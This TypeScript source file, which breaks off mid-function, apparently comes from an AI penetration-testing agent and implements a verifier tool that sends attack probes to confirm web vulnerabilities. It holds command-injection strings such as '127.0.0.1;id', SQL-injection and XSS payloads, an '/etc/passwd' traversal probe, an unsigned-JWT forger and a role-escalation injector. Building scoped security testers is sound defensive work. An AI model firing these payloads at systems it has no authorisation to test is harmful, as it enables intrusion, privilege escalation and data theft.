import { Type } from "typebox";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import type { ToolRuntime } from "../types.js";
import { observeAttackSurface } from "../runtime/coverage-auditor.js";
import { extractHtmlToken, mergeSessionHeaders, rememberResponseCookies } from "../runtime/session-headers.js";
import { emitToolEvidence, isInScope, jsonResult, resolveTargetUrl, textResult } from "./common.js";
import { sendHttp } from "./http.js";

type VerifyResult = {
  confirmed: boolean;
  reason: string;
  evidence_id?: string;
  baseline_traffic_id?: string;
  attack_traffic_id?: string;
  traffic_ids?: string[];
  requests: Array<{ method: string; url: string; status: number; marker?: string }>;
  details?: Record<string, unknown>;
};

type HttpProbe = { method: string; url: string; status: number; headers: Record<string, string>; body: string; requestHeaders: Record<string, string>; requestBody?: string };

/** Active runtime for the current verifier execute; used to persist Set-Cookie into the session jar. */
let activeVerifierRuntime: ToolRuntime | undefined;

async function sendHttpTracked(input: {
  method: string;
  url: string;
  headers: Record<string, string>;
  body?: string;
  proxyUrl?: string;
}): Promise<{ status: number; statusText: string; headers: Record<string, string>; body: string }> {
  const headers = activeVerifierRuntime ? mergeSessionHeaders(activeVerifierRuntime, input.headers) : input.headers;
  const result = await sendHttp({ ...input, headers });
  if (activeVerifierRuntime) rememberResponseCookies(activeVerifierRuntime, result.headers);
  return result;
}

export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
  return {
    name: "verifier",
    label: "Verifier",
    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, path-traversal, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload, csrf, brute-force, javascript-logic, idor, jwt-alg-none, open-redirect, mass-assignment.",
    promptSnippet: "Run a deterministic vulnerability verifier",
    promptGuidelines: [
      "Use verifier after discovering a plausible endpoint/parameter to avoid ad hoc incomplete checks.",
      "Treat verifier confirmed=true as evidence for finding(confirm); treat confirmed=false as a negative or inconclusive coverage result with notes.",
      "For state-changing verifiers, use harmless payloads and restore state when needed.",
      "After recon, batch verifier across coverage(priority_candidates) including idor/jwt-alg-none/open-redirect/path-traversal/mass-assignment when surface shape suggests them.",
    ],
    parameters: Type.Object({
      vuln_class: Type.String(),
      url: Type.String(),
      method: Type.Optional(Type.String()),
      param: Type.Optional(Type.String()),
      headers: Type.Optional(Type.Record(Type.String(), Type.String())),
      payload: Type.Optional(Type.String()),
      true_payload: Type.Optional(Type.String()),
      false_payload: Type.Optional(Type.String()),
      baseline_payload: Type.Optional(Type.String()),
      samples: Type.Optional(Type.Number()),
      file_field: Type.Optional(Type.String()),
      filename: Type.Optional(Type.String()),
      file_content: Type.Optional(Type.String()),
      retrieve_url: Type.Optional(Type.String()),
      retrieve_candidates: Type.Optional(Type.Array(Type.String())),
      baseline_url: Type.Optional(Type.String()),
      check_url: Type.Optional(Type.String()),
      token_param: Type.Optional(Type.String()),
      token_value: Type.Optional(Type.String()),
      stale_token: Type.Optional(Type.String()),
      username_param: Type.Optional(Type.String()),
      password_param: Type.Optional(Type.String()),
      username: Type.Optional(Type.String()),
      password: Type.Optional(Type.String()),
      valid_username: Type.Optional(Type.String()),
      valid_password: Type.Optional(Type.String()),
      invalid_username: Type.Optional(Type.String()),
      invalid_password: Type.Optional(Type.String()),
      success_pattern: Type.Optional(Type.String()),
      failure_pattern: Type.Optional(Type.String()),
      expected_value: Type.Optional(Type.String()),
      fields: Type.Optional(Type.Record(Type.String(), Type.String())),
      object_id: Type.Optional(Type.String()),
      alt_object_id: Type.Optional(Type.String()),
      jwt: Type.Optional(Type.String()),
      privileged_fields: Type.Optional(Type.Record(Type.String(), Type.String())),
    }),
    async execute(_toolCallId: string, params: any) {
      const url = resolveTargetUrl(runtime, params.url);
      if (!isInScope(runtime, url)) throw new Error(`out of scope: ${url}`);
      const vulnClass = String(params.vuln_class || "").toLowerCase();
      const headers = mergeSessionHeaders(runtime, params.headers || {});
      activeVerifierRuntime = runtime;
      try {
        const result = await runVerifier(vulnClass, url, params, headers, runtime.trafficProxyUrl);
        const trafficIds = persistVerifierTraffic(runtime, result);
        result.traffic_ids = trafficIds;
        result.baseline_traffic_id = trafficIds[0];
        result.attack_traffic_id = trafficIds[1] || trafficIds[0];
        const evidenceId = await emitToolEvidence(runtime, "verifier", `${vulnClass} ${url} -> ${result.confirmed ? "confirmed" : "not confirmed"}`, result);
        result.evidence_id = evidenceId;
        await observeAttackSurface(runtime, {
          method: params.method || "GET",
          url,
          responseBody: JSON.stringify(result),
          evidenceIds: [evidenceId],
          source: "verifier",
        });
        await markVerified(runtime, url, params.param || defaultParam(vulnClass), vulnClass, result, evidenceId);
        const payload: Record<string, unknown> = { ...result };
        if (result.confirmed) {
          payload.next_step =
            `Call finding(action='confirm') immediately with evidence_ids=['${evidenceId}'] and full severity/location/impact/poc/remediation. Do not defer confirmation.`;
        }
        return jsonResult(payload, { evidenceId });
      } finally {
        activeVerifierRuntime = undefined;
      }
    },
  };
}

async function runVerifier(
  vulnClass: string,
  url: string,
  params: any,
  headers: Record<string, string>,
  proxyUrl?: string,
): Promise<VerifyResult> {
  if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers, proxyUrl);
  if (vulnClass === "file-inclusion" || vulnClass === "path-traversal") return verifyFileInclusion(url, params, headers, proxyUrl);
  if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers, proxyUrl);
  if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers, proxyUrl);
  if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers, proxyUrl);
  if (vulnClass === "blind-sql-injection") return verifyBlindSql(url, params, headers, proxyUrl);
  if (vulnClass === "weak-session-id") return verifyWeakSessionId(url, params, headers, proxyUrl);
  if (vulnClass === "file-upload") return verifyFileUpload(url, params, headers, proxyUrl);
  if (vulnClass === "csrf") return verifyCsrf(url, params, headers, proxyUrl);
  if (vulnClass === "brute-force") return verifyBruteForce(url, params, headers, proxyUrl);
  if (vulnClass === "javascript-logic") return verifyJavascriptLogic(url, params, headers, proxyUrl);
  if (vulnClass === "idor") return verifyIdor(url, params, headers, proxyUrl);
  if (vulnClass === "jwt-alg-none") return verifyJwtAlgNone(url, params, headers, proxyUrl);
  if (vulnClass === "open-redirect") return verifyOpenRedirect(url, params, headers, proxyUrl);
  if (vulnClass === "mass-assignment") return verifyMassAssignment(url, params, headers, proxyUrl);
  return {
    confirmed: false,
    reason: `unsupported verifier class: ${vulnClass}`,
    requests: [],
  };
}

async function verifyIdor(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const method = (params.method || "GET").toUpperCase();
  const baselineId = String(params.object_id || params.baseline_payload || extractObjectId(url) || "1");
  const altId = String(params.alt_object_id || params.payload || neighborId(baselineId));
  const baselineUrl = replaceObjectId(url, baselineId);
  const attackUrl = replaceObjectId(url, altId);
  const baseline = await sendProbe(method, baselineUrl, headers, params.body, proxyUrl);
  // Unauthenticated or cross-object probe: drop auth if requested, else same headers with alt id.
  const unauthHeaders = { ...headers };
  if (params.drop_auth !== false) {
    delete unauthHeaders.authorization;
    delete unauthHeaders.Authorization;
    delete unauthHeaders.cookie;
    delete unauthHeaders.Cookie;
  }
  const attack = await sendProbe(method, attackUrl, params.keep_auth ? headers : unauthHeaders, params.body, proxyUrl);
  const sensitive = /email|password|token|admin|role|address|card|phone|hash/i.test(attack.body);
  const authorizedShape = baseline.status < 400 && attack.status < 400;
  const differentObject = meaningfulDifference(baseline.body, attack.body) || baselineUrl !== attackUrl;
  const confirmed = authorizedShape && differentObject && (sensitive || attack.body.length > 20);
  return {
    confirmed,
    reason: confirmed
      ? "alternate object identifier returned accessible data without matching ownership controls"
      : "alternate object identifier did not prove unauthorized data access",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline-object" },
      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "cross-object-access" : undefined },
    ],
    details: {
      baseline_id: baselineId,
      alt_id: altId,
      sensitive_fields_hint: sensitive,
      baseline_length: baseline.body.length,
      attack_length: attack.body.length,
      attack_excerpt: attack.body.slice(0, 500),
      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
    },
  };
}

async function verifyJwtAlgNone(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const baseline = await sendProbe(params.method || "GET", url, headers, params.body, proxyUrl);
  const sourceJwt = String(params.jwt || params.token_value || extractBearer(headers) || "");
  if (!sourceJwt || sourceJwt.split(".").length < 2) {
    return {
      confirmed: false,
      reason: "no JWT/bearer token available to mutate for alg=none probe",
      requests: [{ method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" }],
      details: { probes: [probeDetails(baseline, "baseline")] },
    };
  }
  const forged = forgeUnsignedJwt(sourceJwt, params.payload);
  const attackHeaders: Record<string, string> = { ...headers, authorization: `Bearer ${forged}` };
  delete attackHeaders.Authorization;
  const attack = await sendProbe(params.method || "GET", url, attackHeaders, params.body, proxyUrl);
  const baselineDenied = baseline.status === 401 || baseline.status === 403 || /unauthorized|unauthenticated|invalid token|jwt/i.test(baseline.body);
  const attackAccepted = attack.status > 0 && attack.status < 400 && !/invalid token|jwt malformed|unauthorized/i.test(attack.body);
  // Also compare privileged marker presence when baseline was unauthenticated.
  const confirmed = attackAccepted && (baselineDenied || meaningfulDifference(baseline.body, attack.body));
  return {
    confirmed,
    reason: confirmed
      ? "server accepted an unsigned/alg=none JWT style token for a protected endpoint"
      : "unsigned/alg=none JWT probe did not prove acceptance",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "alg-none-accepted" : undefined },
    ],
    details: {
      forged_token_preview: `${forged.slice(0, 48)}...`,
      baseline_status: baseline.status,
      attack_status: attack.status,
      attack_excerpt: attack.body.slice(0, 500),
      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
    },
  };
}

async function verifyOpenRedirect(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "to" ;
  const external = params.payload || "https://example.com/node2-open-redirect";
  const baseline = await requestWithParam(url, params.method || "GET", param, params.baseline_payload || "/", headers, proxyUrl);
  const attack = await requestWithParam(url, params.method || "GET", param, external, headers, proxyUrl);
  const location = attack.headers.location || attack.headers.Location || "";
  const bodyRedirect = /location\.href\s*=\s*["']https?:\/\/example\.com|meta http-equiv=["']refresh["'][^>]+example\.com/i.test(attack.body);
  const confirmed = /example\.com/i.test(location) || bodyRedirect;
  return {
    confirmed,
    reason: confirmed
      ? "external absolute URL was accepted in a redirect/navigation sink"
      : "redirect parameter did not navigate to an external absolute URL",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? location || "body-redirect" : undefined },
    ],
    details: {
      param,
      external,
      location,
      body_redirect: bodyRedirect,
      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
    },
  };
}

async function verifyMassAssignment(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const method = (params.method || "POST").toUpperCase();
  const privilegedFields = { ...(params.privileged_fields || { role: "admin" }) };
  const baseFields = { ...(params.fields || {}) };
  if (!Object.keys(baseFields).length) {
    baseFields.email = params.username || `node2-${Date.now()}@example.com`;
    baseFields.password = params.password || "Node2Pass!23";
    baseFields.passwordRepeat = baseFields.password;
  }
  // Never send privileged fields on the baseline create/update — agents sometimes put role/admin in `fields`.
  for (const key of Object.keys(privilegedFields)) {
    delete baseFields[key];
  }
  // Unique identities so the attack is not rejected as "email already exists" after a successful baseline.
  const stamp = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  if (baseFields.email || privilegedFields.email) {
    baseFields.email = `node2_base_${stamp}@example.com`;
  }
  if (baseFields.username || privilegedFields.username) {
    baseFields.username = `node2_base_${stamp}`;
  }
  const privileged = {
    ...baseFields,
    ...privilegedFields,
  };
  if (privileged.email) privileged.email = `node2_priv_${stamp}@example.com`;
  if (privileged.username) privileged.username = `node2_priv_${stamp}`;

  // API-style endpoints commonly expect JSON create/update bodies.
  const useJson = /\/api\/|\/rest\/|application\/json/i.test(`${url} ${headers["content-type"] || headers["Content-Type"] || ""}`);
  const baseline = useJson
    ? await sendJson(url, method, baseFields, headers, proxyUrl)
    : await requestWithFields(url, method, baseFields, headers, proxyUrl);
  const attack = useJson
    ? await sendJson(url, method, privileged, headers, proxyUrl)
    : await requestWithFields(url, method, privileged, headers, proxyUrl);
  const privilegeHint = /"role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"admin"\s*:\s*true/i.test(attack.body);
  const baselinePrivilege = /"role"\s*:\s*"admin"|"isAdmin"\s*:\s*true|"admin"\s*:\s*true/i.test(baseline.body);
  const accepted = attack.status > 0 && attack.status < 400;
  // Prefer attack that elevates beyond a non-privileged baseline; still confirm if attack alone proves privilege.
  const confirmed = accepted && privilegeHint && !baselinePrivilege;
  return {
    confirmed,
    reason: confirmed
      ? "create/update accepted privileged fields and response indicates elevated role/privilege"
      : "privileged field injection did not prove mass assignment",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "privileged-fields-accepted" : undefined },
    ],
    details: {
      privileged_fields: Object.keys(privilegedFields),
      attack_excerpt: attack.body.slice(0, 500),
      probes: [probeDetails(baseline, "baseline"), probeDetails(attack, "attack")],
    },
  };
}

async function sendJson(
  url: string,
  method: string,
  fields: Record<string, string>,
  headers: Record<string, string>,
  proxyUrl?: string,
): Promise<HttpProbe> {
  const body = JSON.stringify(fields);
  const requestHeaders = { "content-type": "application/json", ...headers };
  const response = await sendHttpTracked({ method, url, headers: requestHeaders, body, proxyUrl });
  return { method, url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
}

function extractObjectId(rawUrl: string): string | undefined {
  try {
    const url = new URL(rawUrl);
    for (const key of ["id", "userId", "basketId", "orderId"]) {
      if (url.searchParams.get(key)) return url.searchParams.get(key) || undefined;
    }
    const match = url.pathname.match(/\/(\d+)(?:\/|$)/);
    return match?.[1];
  } catch {
    return undefined;
  }
}

function neighborId(value: string): string {
  if (/^\d+$/.test(value)) return String(Math.max(1, Number(value) + 1));
  return `${value}-2`;
}

function replaceObjectId(rawUrl: string, objectId: string): string {
  try {
    const url = new URL(rawUrl);
    for (const key of ["id", "userId", "basketId", "orderId"]) {
      if (url.searchParams.has(key)) {
        url.searchParams.set(key, objectId);
        return url.toString();
      }
    }
    if (/\/\d+(?:\/|$)/.test(url.pathname)) {
      url.pathname = url.pathname.replace(/\/\d+(?=\/|$)/, `/${objectId}`);
      return url.toString();
    }
    url.searchParams.set("id", objectId);
    return url.toString();
  } catch {
    return rawUrl;
  }
}

function extractBearer(headers: Record<string, string>): string | undefined {
  const auth = headers.authorization || headers.Authorization || "";
  const match = /Bearer\s+(\S+)/i.exec(auth);
  return match?.[1];
}

function forgeUnsignedJwt(sourceJwt: string, payloadOverride?: string): string {
  const parts = sourceJwt.split(".");
  const payloadB64 = parts[1] || Buffer.from(payloadOverride || '{"sub":"node2"}', "utf8").toString("base64url");
  let payload = payloadB64;
  if (payloadOverride) {
    payload = Buffer.from(payloadOverride, "utf8").toString("base64url");
  } else {
    try {
      const json = JSON.parse(Buffer.from(payloadB64, "base64url").toString("utf8"));
      if (json && typeof json === "object") {
        json.sub = json.sub || "node2-alg-none";
        payload = Buffer.from(JSON.stringify(json), "utf8").toString("base64url");
      }
    } catch {
      // keep original payload segment
    }
  }
  const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" }), "utf8").toString("base64url");
  return `${header}.${payload}.`;
}

async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "ip";
  const payloads = uniquePayloads([
    params.payload,
    "127.0.0.1;id",
    "127.0.0.1|id",
    "127.0.0.1 && id",
    "127.0.0.1; id",
  ]);
  const baselinePayload = params.baseline_payload || "127.0.0.1";
  const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers, proxyUrl);
  const probes: HttpProbe[] = [baseline];
  let confirmed = false;
  let marker: string | undefined;
  let winningPayload = payloads[0] || "";
  let attack = baseline;
  const baselineHasMarker = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(baseline.body);
  for (const payload of payloads) {
    const response = await requestWithParam(url, params.method || "POST", param, payload, headers, proxyUrl);
    probes.push(response);
    const hit = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
    if (hit && !baselineHasMarker) {
      confirmed = true;
      marker = hit;
      winningPayload = payload;
      attack = response;
      break;
    }
  }
  return {
    confirmed,
    reason: confirmed ? "command output marker observed only after injected payload" : "no command output marker observed",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: attack.method, url: attack.url, status: attack.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: winningPayload,
      payloads_tried: payloads,
      baseline_length: baseline.body.length,
      injected_length: attack.body.length,
      marker,
      response_excerpt: marker ? excerptAround(attack.body, marker) : attack.body.slice(0, 500),
      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : "attack")),
    },
  };
}

async function verifyFileInclusion(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "page";
  const payload = params.payload || "/etc/passwd";
  const baselinePayload = params.baseline_payload || "include.php";
  const baseline = await requestWithParam(url, "GET", param, baselinePayload, headers, proxyUrl);
  const response = await requestWithParam(url, "GET", param, payload, headers, proxyUrl);
  const marker = /root:x:0:0:[^\n<]*|www-data:x:[^\n<]*/i.exec(response.body)?.[0];
  const confirmed = Boolean(marker) && !baseline.body.includes(marker || "\u0000");
  return {
    confirmed,
    reason: confirmed ? "local file content marker observed only after traversal/include payload" : "no local file marker observed",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      marker,
      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
    },
  };
}

async function verifySqlInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "id";
  const baselinePayload = params.baseline_payload || "1";
  const payloads = uniquePayloads([
    params.payload,
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1 OR 1=1",
    "1' UNION SELECT null, version() -- ",
  ]);
  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers, proxyUrl);
  const probes: HttpProbe[] = [baseline];
  let confirmed = false;
  let marker: string | undefined;
  let winningPayload = payloads[0] || "";
  let attack = baseline;
  for (const payload of payloads) {
    const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
    probes.push(response);
    const hit = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin|sqlite_version|UNION/i.exec(response.body)?.[0];
    if (hit && meaningfulDifference(baseline.body, response.body)) {
      confirmed = true;
      marker = hit;
      winningPayload = payload;
      attack = response;
      break;
    }
  }
  return {
    confirmed,
    reason: confirmed ? "SQL payload produced database-specific or semantic response difference" : "SQL payload did not produce a meaningful difference",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: attack.method, url: attack.url, status: attack.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: winningPayload,
      payloads_tried: payloads,
      baseline_length: baseline.body.length,
      injected_length: attack.body.length,
      marker,
      response_excerpt: marker ? excerptAround(attack.body, marker) : attack.body.slice(0, 500),
      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : "attack")),
    },
  };
}

function uniquePayloads(values: Array<string | undefined>): string[] {
  const out: string[] = [];
  for (const value of values) {
    const text = String(value || "").trim();
    if (text && !out.includes(text)) out.push(text);
  }
  return out;
}

async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "name";
  const payload = params.payload || "<script>alert(1)</script>";
  const baselinePayload = params.baseline_payload || "node2-baseline";
  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers, proxyUrl);
  const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
  const reflected = response.body.includes(payload);
  const baselineReflected = baseline.body.includes(payload);
  const executableContext = reflected && /<pre>\s*Hello\s*<script>alert\(1\)<\/script>|<script>alert\(1\)<\/script>/i.test(response.body);
  const confirmed = reflected && !baselineReflected && executableContext;
  return {
    confirmed,
    reason: confirmed ? "payload reflected verbatim in executable HTML context" : reflected ? "payload reflected but executable context was not proven" : "payload not reflected verbatim",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: reflected ? payload : undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      executable_context: executableContext,
      response_excerpt: reflected ? excerptAround(response.body, payload) : response.body.slice(0, 500),
      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
    },
  };
}

async function verifyStoredXss(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const payload = params.payload || "<svg/onload=alert(1)>";
  const fields = { ...(params.fields || {}) };
  if (!Object.keys(fields).length) {
    fields.txtName = "x";
    fields.mtxMessage = payload;
    fields.btnSign = "Sign Guestbook";
  }
  const postHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
  const postBody = new URLSearchParams(fields).toString();
  const postResponse = await sendHttpTracked({ method: "POST", url, headers: postHeaders, body: postBody, proxyUrl });
  const getResponse = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
  const post: HttpProbe = { method: "POST", url, status: postResponse.status, headers: postResponse.headers, body: postResponse.body, requestHeaders: postHeaders, requestBody: postBody };
  const get: HttpProbe = { method: "GET", url, status: getResponse.status, headers: getResponse.headers, body: getResponse.body, requestHeaders: headers };
  const confirmed = get.body.includes(payload);
  return {
    confirmed,
    reason: confirmed ? "payload persisted after second retrieval" : "payload was not observed on second retrieval",
    requests: [
      { method: "POST", url, status: post.status },
      { method: "GET", url, status: get.status, marker: confirmed ? payload : undefined },
    ],
    details: {
      payload,
      fields: Object.keys(fields),
      post_length: post.body.length,
      get_length: get.body.length,
      response_excerpt: confirmed ? excerptAround(get.body, payload) : get.body.slice(0, 500),
      probes: [probeDetails(post, "attack"), probeDetails(get, "baseline")],
    },
  };
}

async function verifyBlindSql(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const param = params.param || "id";
  const truePayload = params.true_payload || "1 AND 1=1";
  const falsePayload = params.false_payload || "1 AND 1=2";
  const trueResponse = await requestWithParam(url, "GET", param, truePayload, headers, proxyUrl);
  const falseResponse = await requestWithParam(url, "GET", param, falsePayload, headers, proxyUrl);
  const confirmed = meaningfulDifference(trueResponse.body, falseResponse.body) || trueResponse.status !== falseResponse.status;
  const trueMarker = /User ID exists|First name:|Surname:|exists/i.exec(trueResponse.body)?.[0];
  const falseMarker = /User ID is MISSING|missing|does not exist/i.exec(falseResponse.body)?.[0];
  return {
    confirmed,
    reason: confirmed ? "controlled true/false payloads produced different responses" : "true/false payloads did not produce a meaningful difference",
    requests: [
      { method: "GET", url: trueResponse.url, status: trueResponse.status, marker: trueMarker || "true-predicate" },
      { method: "GET", url: falseResponse.url, status: falseResponse.status, marker: falseMarker || "false-predicate" },
    ],
    details: {
      param,
      true_payload: truePayload,
      false_payload: falsePayload,
      true_length: trueResponse.body.length,
      false_length: falseResponse.body.length,
      true_marker: trueMarker,
      false_marker: falseMarker,
      true_excerpt: trueMarker ? excerptAround(trueResponse.body, trueMarker) : trueResponse.body.slice(0, 300),
      false_excerpt: falseMarker ? excerptAround(falseResponse.body, falseMarker) : falseResponse.body.slice(0, 300),
      probes: [probeDetails(trueResponse, "true"), probeDetails(falseResponse, "false")],
    },
  };
}

async function verifyWeakSessionId(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const samples = Math.max(3, Math.min(Number(params.samples || 5), 20));
  const values: string[] = [];
  const requests: VerifyResult["requests"] = [];
  for (let i = 0; i < samples; i += 1) {
    const response = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
    requests.push({ method: "GET", url, status: response.status });
    const cookie = response.headers["set-cookie"] || "";
    const match = /(?:^|,\s*)([^=;,]+)=([^;,]+)/.exec(cookie);
    if (match) values.push(match[2]);
  }
  const confirmed = values.length >= 3 && looksSequential(values);
  return {
    confirmed,
    reason: confirmed ? "session/token samples look sequential or low-variance" : "session/token samples did not show a simple predictable pattern",
    requests,
    details: { samples: values },
  };
}

async function verifyFileUpload(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const boundary = `----node2-${Date.now().toString(16)}`;
  const fileField = params.file_field || "uploaded";
  const filename = params.filename || "node2-proof.txt";
  const fileContent = params.file_content || "NODE2_UPLOAD_PROOF";
  const fields = { ...(params.fields || {}), btnUpload: params.fields?.btnUpload || "Upload" };
  const body = multipartBody(boundary, fields, fileField, filename, fileContent);
  const requestHeaders = { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` };
  const uploadResponse = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
  const uploadProbe: HttpProbe = {
    method: "POST",
    url,
    status: uploadResponse.status,
    headers: uploadResponse.headers,
    body: uploadResponse.body,
    requestHeaders,
    requestBody: body,
  };
  const accepted = uploadResponse.body.includes(filename) || /upload(?:ed)?|success|succesfully/i.test(uploadResponse.body);
  const candidates = uploadRetrievalCandidates(url, uploadResponse.body, filename, params);
  const retrievals: HttpProbe[] = [];
  let retrieved: HttpProbe | undefined;
  for (const candidate of candidates) {
    const response = await sendHttpTracked({ method: "GET", url: candidate, headers, proxyUrl });
    const probe: HttpProbe = {
      method: "GET",
      url: candidate,
      status: response.status,
      headers: response.headers,
      body: response.body,
      requestHeaders: headers,
    };
    retrievals.push(probe);
    if (response.body.includes(fileContent)) {
      retrieved = probe;
      break;
    }
  }
  const confirmed = Boolean(retrieved);
  return {
    confirmed,
    reason: confirmed
      ? "uploaded file marker was retrieved from a web-accessible URL"
      : accepted
        ? "upload appeared accepted, but uploaded marker was not retrievable"
        : "upload response did not indicate success",
    requests: [
      { method: "POST", url, status: uploadProbe.status, marker: accepted ? filename : undefined },
      ...retrievals.map((probe) => ({ method: "GET", url: probe.url, status: probe.status, marker: probe === retrieved ? fileContent : undefined })),
    ],
    details: {
      file_field: fileField,
      filename,
      marker: fileContent,
      accepted,
      retrieval_candidates: candidates,
      response_excerpt: accepted ? excerptAround(uploadResponse.body, filename) : uploadResponse.body.slice(0, 500),
      retrieved_url: retrieved?.url,
      probes: [probeDetails(uploadProbe, "attack"), ...retrievals.map((probe, index) => probeDetails(probe, index === retrievals.indexOf(retrieved as HttpProbe) ? "retrieval" : "probe"))],
    },
  };
}

async function verifyCsrf(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const method = (params.method || "POST").toUpperCase();
  const checkUrl = params.check_url ? resolveSiblingUrl(url, params.check_url) : params.baseline_url ? resolveSiblingUrl(url, params.baseline_url) : url;
  const tokenParam = params.token_param || firstTokenField(params.fields || {}) || "csrf_token";
  const successPattern = optionalRegexFrom(params.success_pattern);
  const failurePattern = regexFrom(params.failure_pattern || "\\bcsrf\\b|forbidden|invalid|denied|bad token|invalid token|missing token");
  const baseline = await sendProbe("GET", checkUrl, headers, undefined, proxyUrl);
  const attackFields = { ...(params.fields || {}) };
  if (params.stale_token) attackFields[tokenParam] = String(params.stale_token);
  else delete attackFields[tokenParam];
  // CSRF probes must NOT harvest a valid form token into the attack body.
  const attack = await requestWithFields(url, method, attackFields, headers, proxyUrl, { injectAntiCsrf: false });
  const after = await sendProbe("GET", checkUrl, headers, undefined, proxyUrl);
  const attackSuccess = successPattern ? successPattern.test(attack.body) : !failurePattern.test(attack.body) && attack.status < 400;
  const stateChanged = meaningfulDifference(baseline.body, after.body) || submittedValueAppeared(baseline.body, after.body, attackFields);
  const confirmed = attackSuccess && (stateChanged || Boolean(successPattern?.test(attack.body)));
  const probes = after ? [baseline, attack, after] : [baseline, attack];
  return {
    confirmed,
    reason: confirmed
      ? "state-changing request succeeded without a valid CSRF token"
      : "missing/stale-token request did not prove a state change",
    requests: probes.map((probe, index) => ({
      method: probe.method,
      url: probe.url,
      status: probe.status,
      marker: index === 0 ? "baseline" : index === 1 ? "attack" : "after",
    })),
    details: {
      token_param: tokenParam,
      omitted_or_stale_token: !Object.prototype.hasOwnProperty.call(attackFields, tokenParam) ? "omitted" : "stale",
      success_pattern: params.success_pattern,
      failure_pattern: params.failure_pattern,
      baseline_length: baseline.body.length,
      attack_length: attack.body.length,
      after_length: after?.body.length,
      state_changed: stateChanged,
      attack_success: attackSuccess,
      response_excerpt: attack.body.slice(0, 500),
      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : index === 1 ? "attack" : "after")),
    },
  };
}

async function verifyBruteForce(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
  const method = (params.method || "POST").toUpperCase();
  const usernameParam = params.username_param || "username";
